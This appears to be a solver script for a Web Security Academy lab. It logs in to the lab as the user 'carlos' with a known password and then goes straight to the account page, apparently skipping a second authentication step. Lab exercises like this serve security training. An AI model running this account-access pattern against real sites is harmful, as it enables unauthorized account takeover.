# usage:
# python3 2.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net \
# --w carlos \
# --p montoya

from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str, who: str, password: str) -> None:
        self.url = url.rstrip("/")
        self.who = who
        self.password = password
        self.s = None

    def login(self, username: str, password: str) -> requests.Response:
        self.s = requests.Session()
        r = self.s.post(
            f"{self.url}/login",
            data={
                "username": username,
                "password": password,
            },
        )

        return r

    def solve(self) -> None:
        self.login(self.who, self.password)
        self.s.get(f"{self.url}/my-account")


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--w", "--who", dest="who")
    parser.add_argument("--p", "--password", dest="password")
    args = parser.parse_args()
    s = Solution(args.url, args.who, args.password)
    s.solve()


if __name__ == "__main__":
    main()
